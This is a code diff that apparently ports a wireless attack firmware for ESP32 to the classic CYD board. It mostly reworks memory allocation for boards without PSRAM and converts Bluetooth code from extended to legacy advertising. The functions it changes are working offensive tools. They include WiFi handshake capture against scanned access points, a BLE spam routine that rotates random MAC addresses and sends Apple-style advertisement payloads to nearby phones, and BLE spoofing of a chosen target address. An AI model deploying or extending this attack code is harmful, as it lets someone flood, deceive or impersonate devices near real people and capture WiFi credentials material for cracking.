     title_bar = lv_obj_create(lv_scr_act());
@@ -5836,8 +5819,17 @@ void app_main(void)
 	//Initialize GPS UART and start background monitor task
 	if (init_gps_uart() == ESP_OK) {
 		ESP_LOGI(TAG, "GPS UART initialized on TX=%d RX=%d", GPS_TX_PIN, GPS_RX_PIN);
-		// Allocate GPS task stack from PSRAM
+		// CYD port: classic ESP32 (ESP32-2432S028R) has no PSRAM — try SPIRAM
+		// first (harmless on targets that have it), else fall back to internal DRAM.
 		gps_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+#ifdef CONFIG_ESP32_SPIRAM_SUPPORT
+		// PSRAM available — keep the SPIRAM allocation
+#else
+		if (gps_task_stack == NULL) {
+			// PSRAM not present (CYD) or allocation failed — use internal DRAM.
+			gps_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_8BIT);
+		}
+#endif
 		if (gps_task_stack != NULL) {
 			TaskHandle_t task_handle = xTaskCreateStatic(gps_task, "gps_task", 4096, NULL,
 				tskIDLE_PRIORITY + 1, gps_task_stack, &gps_task_buffer);
@@ -5846,10 +5838,10 @@ void app_main(void)
 				heap_caps_free(gps_task_stack);
 				gps_task_stack = NULL;
 			} else {
-				ESP_LOGI(TAG, "GPS monitor running in background (PSRAM) (log every few seconds)");
+				ESP_LOGI(TAG, "GPS monitor running in background (PSRAM if present, else DRAM)");
 			}
 		} else {
-			ESP_LOGE(TAG, "Failed to allocate GPS task stack from PSRAM");
+			ESP_LOGE(TAG, "Failed to allocate GPS task stack (SPIRAM/DRAM)");
 		}
 	} else {
 		ESP_LOGE(TAG, "GPS UART init failed");
@@ -5881,12 +5873,18 @@ void app_main(void)
     // (in ensure_wifi_mode) to avoid registering handlers before WiFi is ready
 
     // Allocate sniffer handshake + wardrive promisc arrays in PSRAM
+    // CYD port: no PSRAM on ESP32-2432S028R — allocate from internal RAM if
+    // SPIRAM is unavailable. These are heap buffers (not static), so ~10KB total
+    // is affordable from the internal heap.
     hs_ap_targets = (hs_ap_target_t *)heap_caps_calloc(HS_MAX_APS, sizeof(hs_ap_target_t), MALLOC_CAP_SPIRAM);
+    if (!hs_ap_targets) hs_ap_targets = (hs_ap_target_t *)heap_caps_calloc(HS_MAX_APS, sizeof(hs_ap_target_t), MALLOC_CAP_8BIT);
     hs_clients = (hs_client_entry_t *)heap_caps_calloc(HS_MAX_CLIENTS, sizeof(hs_client_entry_t), MALLOC_CAP_SPIRAM);
+    if (!hs_clients) hs_clients = (hs_client_entry_t *)heap_caps_calloc(HS_MAX_CLIENTS, sizeof(hs_client_entry_t), MALLOC_CAP_8BIT);
     ducb_channels = (ducb_channel_t *)heap_caps_calloc(dual_band_channels_count, sizeof(ducb_channel_t), MALLOC_CAP_SPIRAM);
+    if (!ducb_channels) ducb_channels = (ducb_channel_t *)heap_caps_calloc(dual_band_channels_count, sizeof(ducb_channel_t), MALLOC_CAP_8BIT);
     // wdp_seen_networks is now a fixed 50-entry array (no dynamic allocation needed)
     if (!hs_ap_targets || !hs_clients || !ducb_channels) {
-        ESP_LOGE(TAG, "PSRAM alloc FAILED!");
+        ESP_LOGE(TAG, "Handshake/DUCB heap alloc FAILED!");
     }
 
     lvgl_memory_init();
@@ -5934,7 +5932,16 @@ void app_main(void)
         return;
     }
 
+    // CYD port: screenshot task is OPTIONAL — never block display/UI bring-up on it.
+    // Try PSRAM first, then internal DRAM; if both fail, warn and continue (no screenshots).
     screenshot_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+#ifdef CONFIG_ESP32_SPIRAM_SUPPORT
+    // PSRAM available — keep SPIRAM allocation
+#else
+    if (screenshot_task_stack == NULL) {
+        screenshot_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_8BIT);
+    }
+#endif
     if (screenshot_task_stack != NULL) {
         screenshot_task_handle = xTaskCreateStatic(
             screenshot_save_task,
@@ -5948,11 +5955,11 @@ void app_main(void)
             ESP_LOGE(TAG, "Failed to create screenshot save task");
             heap_caps_free(screenshot_task_stack);
             screenshot_task_stack = NULL;
-            return;
+        } else {
+            ESP_LOGI(TAG, "Screenshot save task running (SPIRAM if present, else DRAM)");
         }
     } else {
-        ESP_LOGE(TAG, "Failed to allocate screenshot task stack");
-        return;
+        ESP_LOGW(TAG, "Screenshot save task disabled (no RAM for stack) — continuing anyway");
     }
 
     // 15 lines per buffer — works for both 16-bit (7200 B) and 32-bit (14400 B) color depth.
@@ -6093,9 +6100,10 @@ void app_main(void)
     // Initialize SD cache structure in PSRAM
     esp_err_t cache_ret = sd_cache_init();
     if (cache_ret != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to initialize SD cache - halting");
-        show_sd_loading_popup("PSRAM Error!\nCannot allocate cache");
-        while (1) { vTaskDelay(pdMS_TO_TICKS(1000)); }
+        // CYD port: never halt the UI here. Classic ESP32 has no PSRAM, so SD
+        // cache may not be allocatable — degrade gracefully (SD browser lists
+        // dirs on the fly) instead of blocking the whole device.
+        ESP_LOGW(TAG, "SD cache unavailable (no PSRAM on CYD) — using on-the-fly browsing");
     }
     
     // Cancel splash auto-transition — SD init controls the splash timing
@@ -6175,38 +6183,49 @@ void app_main(void)
         }
 
         if (!sd_mounted) {
-            ESP_LOGW(TAG, "[SD] All %d attempts failed (card_responded=%d) — showing error screen",
-                     SD_MAX_ATTEMPTS, card_responded);
-            int choice = show_sd_error_screen(card_responded);
+            if (!card_responded) {
+                /* No card present at all — don't trap the user on a blocking
+                 * error screen; SD mounts lazily on first use instead. */
+                ESP_LOGW(TAG, "[SD] No card detected — continuing without SD (lazy mount on first use)");
+                keep_trying = false;
+            } else {
+                ESP_LOGW(TAG, "[SD] All %d attempts failed (card_responded=%d) — showing error screen",
+                         SD_MAX_ATTEMPTS, card_responded);
+                int choice = show_sd_error_screen(card_responded);
 
-            if (choice == SD_ERR_RETRY) {
-                show_sd_loading_popup("Retrying SD card...");
-                vTaskDelay(pdMS_TO_TICKS(100));
-
-            } else if (choice == SD_ERR_FORMAT) {
-                /* User tapped Format — confirm before proceeding */
-                bool confirmed = show_sd_format_confirm();
-                if (confirmed) {
-                    show_sd_loading_popup("Formatting SD card...\nPlease wait...");
-                    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(10000)) == pdTRUE) {
-                        esp_err_t fmt_ret = wifi_wardrive_init_sd_ex(5000, true);
-                        xSemaphoreGive(sd_spi_mutex);
-                        if (fmt_ret == ESP_OK) {
-                            sd_mounted_lazy = true;
-                            sd_mounted = true;
-                            ESP_LOGI(TAG, "[SD] Format + mount succeeded");
-                        } else {
-                            ESP_LOGW(TAG, "[SD] Format attempt failed: %s", esp_err_to_name(fmt_ret));
-                            /* Fall back to error screen next iteration */
-                        }
-                    }
-                }
-                /* If not confirmed or format failed, loop back to error screen */
-                if (!sd_mounted) {
+                if (choice == SD_ERR_RETRY) {
                     show_sd_loading_popup("Retrying SD card...");
                     vTaskDelay(pdMS_TO_TICKS(100));
-                }
 
+                } else if (choice == SD_ERR_FORMAT) {
+                    /* User tapped Format — confirm before proceeding */
+                    bool confirmed = show_sd_format_confirm();
+                    if (confirmed) {
+                        show_sd_loading_popup("Formatting SD card...\nPlease wait...");
+                        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(10000)) == pdTRUE) {
+                            esp_err_t fmt_ret = wifi_wardrive_init_sd_ex(5000, true);
+                            xSemaphoreGive(sd_spi_mutex);
+                            if (fmt_ret == ESP_OK) {
+                                sd_mounted_lazy = true;
+                                sd_mounted = true;
+                                ESP_LOGI(TAG, "[SD] Format + mount succeeded");
+                            } else {
+                                ESP_LOGW(TAG, "[SD] Format attempt failed: %s", esp_err_to_name(fmt_ret));
+                                /* Fall back to error screen next iteration */
+                            }
+                        }
+                    }
+                    /* If not confirmed or format failed, loop back to error screen */
+                    if (!sd_mounted) {
+                        show_sd_loading_popup("Retrying SD card...");
+                        vTaskDelay(pdMS_TO_TICKS(100));
+                    }
+
+                } else {
+                    /* SD_ERR_CONTINUE — run without the SD card */
+                    ESP_LOGW(TAG, "[SD] User chose to continue without SD card");
+                    keep_trying = false;
+                }
             }
         }
     }
@@ -11418,12 +11437,13 @@ static void handshake_yes_btn_cb(lv_event_t *e)
         handshake_target_count = g_shared_selected_count;
         for (int i = 0; i < g_shared_selected_count; i++) {
             int idx = g_shared_selected_indices[i];
+            if (i >= MAX_AP_CNT / 4 || idx < 0) break;  // CYD port: quartered capacity
             memcpy(&handshake_targets[i], &g_shared_scan_results[idx], sizeof(wifi_ap_record_t));
         }
     } else {
         handshake_selected_mode = false;
         if (g_shared_scan_count > 0) {
-            handshake_target_count = (g_shared_scan_count < MAX_AP_CNT) ? g_shared_scan_count : MAX_AP_CNT;
+            handshake_target_count = (g_shared_scan_count < MAX_AP_CNT / 4) ? g_shared_scan_count : MAX_AP_CNT / 4;
             memcpy(handshake_targets, g_shared_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
         } else {
             handshake_waiting_for_scan = true;
@@ -14291,7 +14311,6 @@ static const nav_show_entry_t NAV_SHOW_TABLE[] = {
     { "Hardware Options",     show_hardware_options_screen },
     { "NM-RF-HAT",            show_nmrfhat_settings_screen },
     { "Data Transfer",        show_data_transfer_screen    },
-    { "Zigbee Scout",         show_zigbee_wardrive_screen  },
     { "Infrared",             show_ir_menu_screen          },
     { "Radio",                show_radio_menu_screen       },
     { "NFC / RFID Hub",       show_nfc_hub_screen          },
@@ -14952,8 +14971,6 @@ static void main_tile_event_cb(lv_event_t *e)
     // NM-RF-HAT tiles
     } else if (strcmp(tile_name, "IR Menu") == 0) {
         show_dip_switch_popup(4, "Infrared (IR)", show_ir_menu_screen);
-    } else if (strcmp(tile_name, "Zigbee") == 0) {
-        show_zigbee_wardrive_screen();
     } else if (strcmp(tile_name, "Radio Menu") == 0) {
         show_radio_menu_screen();
     } else if (strcmp(tile_name, "NFC Hub") == 0) {
@@ -15202,7 +15219,6 @@ static void show_main_tiles(void)
     create_tile(tiles_container, MY_SYMBOL_CAR,         "Wardrive",     COLOR_MATERIAL_RED,     main_tile_event_cb, "Wardrive");
     create_tile(tiles_container, LV_SYMBOL_SETTINGS,    "Settings",     UI_ACCENT_GREEN,        main_tile_event_cb, "Settings");
     create_tile(tiles_container, LV_SYMBOL_POWER,       "Go Dark",      lv_color_hex(0x8A8FA8), main_tile_event_cb, "Go Dark");
-    create_tile(tiles_container, MY_SYMBOL_SITEMAP,     "Zigbee",       lv_color_hex(0x00695C), main_tile_event_cb, "Zigbee");
     // NFC/RFID Hub — always visible; works with RF-HAT PN532 (DIP 3) or standalone breakout on CN1
     create_tile(tiles_container, MY_SYMBOL_MICROCHIP, "NFC/\nRFID",  lv_color_hex(0x00695C), main_tile_event_cb, "NFC Hub");
     // NM-RF-HAT tiles — shown only when the addon board is enabled in Hardware Options
@@ -18588,9 +18604,12 @@ static void show_handshakes_list_screen(void)
 // Download Mode - Force bootloader restart
 void GoToDownloadMode(void)
 {
+#if CONFIG_IDF_TARGET_ESP32C5
     // For ESP32C5, use LP_AON_SYS_CFG_REG
     // LP_AON_FORCE_DOWNLOAD_BOOT[30:29] = 0x1 for download boot0 (UART/USB)
     REG_SET_FIELD(LP_AON_SYS_CFG_REG, LP_AON_FORCE_DOWNLOAD_BOOT, 1);
+#endif
+    // Classic ESP32: plain restart drops into the ROM bootloader
     esp_restart();
 }
 
@@ -20179,7 +20198,7 @@ static void wdup_task(void *pvParameters)
         wdup_push_msg(xmsg, cyan);
         for (int si = 0; si < n && wdup_active; si++) {
             int idx = wdup_explicit_indices[si];
-            if (idx < 0 || idx >= 64 || wd_manage_paths[idx][0] == '\0') continue;
+            if (idx < 0 || idx >= WD_MANAGE_MAX_FILES || wd_manage_paths[idx][0] == '\0') continue;
             const char *xfpath = wd_manage_paths[idx];
             const char *xname  = strrchr(xfpath, '/');
             xname = xname ? xname + 1 : xfpath;
@@ -21655,12 +21674,12 @@ static void show_new_folder_screen(void)
 
 // ─── Delete File browser ──────────────────────────────────────────────────────
 
-#define DELBR_MAX_DIRS 32
+#define DELBR_MAX_DIRS 8
 
 static char      s_delbr_cwd[300];
 static lv_obj_t *s_delbr_list     = NULL;
 static lv_obj_t *s_delbr_path_lbl = NULL;
-EXT_RAM_BSS_ATTR static char s_delbr_dirs[DELBR_MAX_DIRS][256];
+EXT_RAM_BSS_ATTR static char s_delbr_dirs[DELBR_MAX_DIRS][128];
 static int       s_delbr_dir_count = 0;
 static char      s_delbr_del_target[300];
 
@@ -23645,7 +23664,6 @@ static const sd_provision_item_t SD_ITEMS[] = {
     { SD_ITEM_DIR,  "/sdcard/lab/rf433",                     NULL },  /* RF433 HAT captures (Flipper .sub format) */
     { SD_ITEM_DIR,  "/sdcard/lab/radio",                     NULL },  /* CC1101 captures (Flipper .sub) */
     { SD_ITEM_DIR,  "/sdcard/lab/nrf24",                     NULL },  /* nRF24L01 sniffer captures */
-    { SD_ITEM_DIR,  "/sdcard/lab/zigbee",                    NULL },  /* Zigbee Scout wardrive CSV + PCAP */
     { SD_ITEM_DIR,  "/sdcard/lab/zwave",                     NULL },  /* Z-Wave Scout capture CSV */
     { SD_ITEM_DIR,  "/sdcard/lab/tpms",                      NULL },  /* TPMS Monitor Schrader CSV captures */
     { SD_ITEM_DIR,  "/sdcard/lab/espnow",                    NULL },  /* ESP-NOW Scout device export JSON + pktlog */
@@ -24548,12 +24566,13 @@ static void show_sd_free_space_screen(void)
 // ─── Interactive SD file browser ─────────────────────────────────────────────
 
 #define SD_TREE_ROOT     "/sdcard"
-#define SD_TREE_MAX_DIRS 64
+// CYD port: 16 dirs x 256B (was 64 — PSRAM-era capacity, UI lists ~10 rows)
+#define SD_TREE_MAX_DIRS 8
 
 static char      s_sd_tree_cwd[300];
 static lv_obj_t *s_sd_tree_list  = NULL;
 static lv_obj_t *s_sd_path_lbl   = NULL;
-EXT_RAM_BSS_ATTR static char s_sd_dir_paths[SD_TREE_MAX_DIRS][256];
+EXT_RAM_BSS_ATTR static char s_sd_dir_paths[SD_TREE_MAX_DIRS][128];
 static int       s_sd_dir_count  = 0;
 
 static void sd_tree_populate(const char *path);
@@ -30974,7 +30993,7 @@ static void gw_clone_btn_cb(lv_event_t *e)
 }
 
 /* ── Saved Clones browser ── */
-#define CLONE_LIST_MAX 30
+#define CLONE_LIST_MAX 10
 static EXT_RAM_BSS_ATTR char s_clone_files[CLONE_LIST_MAX][80];
 static int  s_clone_count = 0;
 static lv_obj_t *clone_browser_list = NULL;
@@ -31121,7 +31140,7 @@ static lv_obj_t     *mitm_log_ta     = NULL;
 static lv_obj_t     *mitm_status_lbl = NULL;
 static lv_timer_t   *mitm_poll_tmr   = NULL;
 
-#define MITM_LOG_MAX 16
+#define MITM_LOG_MAX 8
 #define MITM_LOG_PAY 48
 typedef struct { bool host_to_target; uint16_t handle; uint8_t data[MITM_LOG_PAY]; uint8_t len; } mitm_log_t;
 static mitm_log_t    mitm_log_ring[MITM_LOG_MAX];
@@ -31970,6 +31989,11 @@ struct ble_spam_state_t {
 } g_ble_spam_state = {0};
 
 // ── BLE Spam timer callback (called by LVGL every 100ms) ────────────────────────
+/* CYD port: legacy advertising has no per-instance config; these dummies keep
+ * the converted BLE Spam / Drone Spoof call sites compiling unchanged. */
+static struct ble_gap_adv_params s_dummy_adv_params;
+static int s_dummy_gap_event(struct ble_gap_event *event, void *arg) { (void)event; (void)arg; return 0; }
+
 static void ble_spam_timer_cb(lv_timer_t *timer)
 {
     (void)timer;
@@ -31981,7 +32005,7 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
     static int packets_since_restart = 0;
     if (st->configured && packets_since_restart >= 200) {
         ESP_LOGI(TAG, "[SPAM] Periodic restart at pkt%d to clear mbuf pool", ble_spam_count);
-        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+        ble_gap_adv_stop();
         vTaskDelay(pdMS_TO_TICKS(100));  // Give controller time to clean up
         st->configured = false;  // Force reconfiguration on next iteration
         packets_since_restart = 0;
@@ -31989,24 +32013,18 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
 
     // Configure on first callback or after restart
     if (!st->configured) {
-        struct ble_gap_ext_adv_params ext_adv_params;
+        /* CYD port: no extended advertising on classic ESP32 — legacy adv instead. */
+        struct ble_gap_adv_params ext_adv_params;
         memset(&ext_adv_params, 0, sizeof(ext_adv_params));
-        ext_adv_params.connectable = 0;
-        ext_adv_params.scannable = 1;  // ADV_SCAN_IND for better receiver compatibility
-        ext_adv_params.legacy_pdu = 1;
-        ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
-        ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
-        ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+        ext_adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
         ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(80);
         ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(100);
-        ext_adv_params.tx_power = 20;  // +20 dBm max TX power
-        ext_adv_params.sid = BLE_SPAM_ADV_INSTANCE;
 
-        ESP_LOGI(TAG, "[SPAM] timer: configuring instance %d (connectable=%d, scannable=%d, legacy_pdu=%d, own_addr_type=%d)",
-                 BLE_SPAM_ADV_INSTANCE, ext_adv_params.connectable, ext_adv_params.scannable,
-                 ext_adv_params.legacy_pdu, ext_adv_params.own_addr_type);
+        ESP_LOGI(TAG, "[SPAM] timer: configuring legacy adv (conn_mode=%d, disc_mode=%d)",
+                 ext_adv_params.conn_mode, ext_adv_params.disc_mode);
 
-        int rc = ble_gap_ext_adv_configure(BLE_SPAM_ADV_INSTANCE, &ext_adv_params, NULL, NULL, NULL);
+        int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &ext_adv_params, s_dummy_gap_event, NULL);
         ESP_LOGI(TAG, "[SPAM] configure() returned %d", rc);
         if (rc != 0) {
             ESP_LOGE(TAG, "[SPAM] configure FAILED: %d — instance state invalid", rc);
@@ -32074,7 +32092,7 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
     // HCI level but the controller's physical state lags; yield 10ms for the
     // disable to propagate before set_addr/set_data to avoid EINVAL host validation
     uint64_t stop_time_us = esp_timer_get_time();
-    ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+    ble_gap_adv_stop();
     vTaskDelay(pdMS_TO_TICKS(30));
     uint64_t after_delay_us = esp_timer_get_time();
     st->started = false;
@@ -32099,12 +32117,14 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         ESP_LOGD(TAG, "[SPAM] pkt%d generated random MAC (type_bits=%02x, expect 0xc0)", ble_spam_count, top_bits);
     }
 
-    ESP_LOGD(TAG, "[SPAM] pkt%d calling set_addr with MAC: %02x:%02x:%02x:%02x:%02x:%02x",
+    ESP_LOGD(TAG, "[SPAM] pkt%d setting random addr: %02x:%02x:%02x:%02x:%02x:%02x",
              ble_spam_count, rnd_addr.val[0], rnd_addr.val[1], rnd_addr.val[2],
              rnd_addr.val[3], rnd_addr.val[4], rnd_addr.val[5]);
-    int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
+    // CYD port: legacy NimBLE has no per-instance set_addr — set the device
+    // random identity address while advertising is stopped, then restart.
+    int addr_rc = ble_hs_id_set_rnd(rnd_addr.val);
     if (addr_rc == 0) {
-        ESP_LOGI(TAG, "[SPAM] pkt%d MAC set OK: %02x:%02x:%02x:%02x:%02x:%02x",
+        ESP_LOGD(TAG, "[SPAM] pkt%d MAC set OK: %02x:%02x:%02x:%02x:%02x:%02x",
                  ble_spam_count, rnd_addr.val[0], rnd_addr.val[1], rnd_addr.val[2],
                  rnd_addr.val[3], rnd_addr.val[4], rnd_addr.val[5]);
     } else {
@@ -32191,7 +32211,8 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
         at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
         at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
-        ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &at_addr);
+        // CYD port: legacy — set device random address directly
+        ble_hs_id_set_rnd(at_addr.val);
         at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
         at_mfg[2] = 0x12; at_mfg[3] = 0x19;
         at_mfg[4] = 0x10;
@@ -32261,27 +32282,21 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         fields.svc_data_uuid16_len = svc_data_len;
     }
 
-    // Allocate fresh mbuf (NimBLE will free it; never reuse)
-    struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
-    if (!om) {
-        ESP_LOGW(TAG, "[SPAM] mbuf alloc failed");
-        return;
-    }
-
-    int rc = ble_hs_adv_set_fields_mbuf(&fields, om);
+    // CYD port: legacy adv — flatten fields into a raw buffer and call
+    // ble_gap_adv_set_data(buf, len) instead of the ext-adv mbuf path.
+    uint8_t adv_buf[BLE_HS_ADV_MAX_SZ];
+    uint8_t adv_len = 0;
+    int rc = ble_hs_adv_set_fields(&fields, adv_buf, &adv_len, BLE_HS_ADV_MAX_SZ);
     if (rc != 0) {
         ESP_LOGW(TAG, "[SPAM] set_fields failed: %d", rc);
-        os_mbuf_free_chain(om);
         return;
     }
 
-    // Set payload (now that instance is stopped and address is fresh)
-    ESP_LOGD(TAG, "[SPAM] pkt%d calling set_data (payload_len=%d)", ble_spam_count, os_mbuf_len(om));
-    rc = ble_gap_ext_adv_set_data(BLE_SPAM_ADV_INSTANCE, om);
+    // Set payload (advertising is already stopped at this point)
+    ESP_LOGD(TAG, "[SPAM] pkt%d calling set_data (payload_len=%d)", ble_spam_count, adv_len);
+    rc = ble_gap_adv_set_data(adv_buf, adv_len);
     if (rc != 0) {
-        // NimBLE always frees om internally on any path (success or failure). Do NOT double-free.
-        // Skip ext_adv_start on failure; instance remains stopped until next timer cycle.
-        ESP_LOGW(TAG, "[SPAM] pkt%d set_data FAILED: rc=%d (instance remains stopped)", ble_spam_count, rc);
+        ESP_LOGW(TAG, "[SPAM] pkt%d set_data FAILED: rc=%d", ble_spam_count, rc);
         return;
     } else {
         ESP_LOGD(TAG, "[SPAM] pkt%d set_data OK", ble_spam_count);
@@ -32289,7 +32304,7 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
 
     // Start advertising with fresh payload and random MAC (seen as new device by phones)
     ESP_LOGD(TAG, "[SPAM] pkt%d calling start (instance=%d)", ble_spam_count, BLE_SPAM_ADV_INSTANCE);
-    rc = ble_gap_ext_adv_start(BLE_SPAM_ADV_INSTANCE, 0, 0);
+    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &s_dummy_adv_params, s_dummy_gap_event, NULL);
     if (rc != 0 && rc != BLE_HS_EALREADY) {
         ESP_LOGW(TAG, "[SPAM] pkt%d start FAILED: rc=%d", ble_spam_count, rc);
     } else {
@@ -32318,8 +32333,8 @@ static void ble_spam_start_btn_cb(lv_event_t *e)
             lv_timer_del(g_ble_spam_state.timer);
             g_ble_spam_state.timer = NULL;
         }
-        ESP_LOGI(TAG, "[SPAM] stopping instance %d (keeping config)", BLE_SPAM_ADV_INSTANCE);
-        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+        ESP_LOGI(TAG, "[SPAM] stopping legacy adv");
+        ble_gap_adv_stop();
         g_ble_spam_state.started = false;
         lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "START");
         lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
@@ -32365,8 +32380,8 @@ static void ble_spam_stop(void)
     ble_spam_counter_label = NULL;
     ble_spam_start_btn = NULL;
     if (current_radio_mode == RADIO_MODE_BLE) {
-        ESP_LOGI(TAG, "[SPAM] cleanup: stopping instance %d", BLE_SPAM_ADV_INSTANCE);
-        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+        ESP_LOGI(TAG, "[SPAM] cleanup: stopping legacy adv");
+        ble_gap_adv_stop();
         bt_nimble_deinit();
         current_radio_mode = RADIO_MODE_NONE;
     }
@@ -32463,22 +32478,18 @@ static void ble_spoof_timer_cb(lv_timer_t *timer)
 
     // Configure on first callback
     if (!st->configured) {
-        struct ble_gap_ext_adv_params ext_adv_params;
+        /* CYD port: no extended advertising on classic ESP32 — legacy adv instead. */
+        struct ble_gap_adv_params ext_adv_params;
         memset(&ext_adv_params, 0, sizeof(ext_adv_params));
-        ext_adv_params.connectable = 0;
-        ext_adv_params.scannable = 1;
-        ext_adv_params.legacy_pdu = 1;
-        ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
-        ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
-        ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+        ext_adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
         ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(200);
         ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(350);
-        ext_adv_params.sid = BLE_SPOOF_ADV_INSTANCE;
 
-        ESP_LOGI(TAG, "[SPOOF] timer: configuring instance %d (connectable=%d, scannable=%d, legacy_pdu=%d)",
-                 BLE_SPOOF_ADV_INSTANCE, ext_adv_params.connectable, ext_adv_params.scannable, ext_adv_params.legacy_pdu);
+        ESP_LOGI(TAG, "[SPOOF] timer: configuring legacy adv (conn_mode=%d, disc_mode=%d)",
+                 ext_adv_params.conn_mode, ext_adv_params.disc_mode);
 
-        int rc = ble_gap_ext_adv_configure(BLE_SPOOF_ADV_INSTANCE, &ext_adv_params, NULL, NULL, NULL);
+        int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &ext_adv_params, s_dummy_gap_event, NULL);
         ESP_LOGI(TAG, "[SPOOF] configure() returned %d", rc);
         if (rc != 0) {
             ESP_LOGE(TAG, "[SPOOF] configure FAILED: %d — instance state invalid", rc);
@@ -32490,17 +32501,17 @@ static void ble_spoof_timer_cb(lv_timer_t *timer)
         ble_addr_t target_addr;
         target_addr.type = BLE_ADDR_RANDOM;
         memcpy(target_addr.val, ble_spoof_target_mac, 6);
-        int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPOOF_ADV_INSTANCE, &target_addr);
+        int addr_rc = ble_hs_id_set_rnd(target_addr.val);
         ESP_LOGI(TAG, "[SPOOF] set_addr() returned %d", addr_rc);
 
-        ESP_LOGI(TAG, "[SPOOF] configure SUCCESS — instance %d configured", BLE_SPOOF_ADV_INSTANCE);
+        ESP_LOGI(TAG, "[SPOOF] configure SUCCESS — legacy adv configured");
         st->configured = true;
     }
 
     // Start immediately after config (once)
     if (!st->started) {
-        ESP_LOGI(TAG, "[SPOOF] timer: attempting start on instance %d", BLE_SPOOF_ADV_INSTANCE);
-        int rc = ble_gap_ext_adv_start(BLE_SPOOF_ADV_INSTANCE, 0, 0);
+        ESP_LOGI(TAG, "[SPOOF] timer: attempting start");
+        int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &s_dummy_adv_params, s_dummy_gap_event, NULL);
         ESP_LOGI(TAG, "[SPOOF] start() returned %d", rc);
         if (rc != 0 && rc != BLE_HS_EALREADY) {
             ESP_LOGE(TAG, "[SPOOF] START FAILED: %d — stack: instance=%d configured=%d started=%d",
@@ -32530,23 +32541,18 @@ static void ble_spoof_timer_cb(lv_timer_t *timer)
         fields.name_is_complete = 1;
     }
 
-    // Allocate fresh mbuf (NimBLE will free it; never reuse)
-    struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
-    if (!om) {
-        ESP_LOGW(TAG, "[SPOOF] mbuf alloc failed");
-        return;
-    }
-
-    int rc = ble_hs_adv_set_fields_mbuf(&fields, om);
+    // CYD port: legacy adv — flatten fields into a raw buffer
+    uint8_t adv_buf[BLE_HS_ADV_MAX_SZ];
+    uint8_t adv_len = 0;
+    int rc = ble_hs_adv_set_fields(&fields, adv_buf, &adv_len, BLE_HS_ADV_MAX_SZ);
     if (rc != 0) {
         ESP_LOGW(TAG, "[SPOOF] set_fields failed: %d", rc);
-        os_mbuf_free_chain(om);
         return;
     }
 
-    // Keep instance active continuously; update data in-place
+    // Keep advertising active continuously; update data in-place
     // Occasional set_data error 3 is benign (keeps old payload flying, phones see continuous presence)
-    rc = ble_gap_ext_adv_set_data(BLE_SPOOF_ADV_INSTANCE, om);
+    rc = ble_gap_adv_set_data(adv_buf, adv_len);
     if (rc != 0) {
         ESP_LOGW(TAG, "[SPOOF] set_data rc=%d (benign; old payload continues)", rc);
     }
@@ -32565,7 +32571,7 @@ static void ble_spoof_start_cb(lv_event_t *e)
             g_ble_spoof_state.timer = NULL;
         }
         ESP_LOGI(TAG, "[SPOOF] stopping instance %d (keeping config)", BLE_SPOOF_ADV_INSTANCE);
-        ble_gap_ext_adv_stop(BLE_SPOOF_ADV_INSTANCE);
+        ble_gap_adv_stop();
         g_ble_spoof_state.started = false;
         lv_label_set_text(lv_obj_get_child(ble_spoof_start_btn, 0), "START SPOOF");
         lv_obj_set_style_bg_color(ble_spoof_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
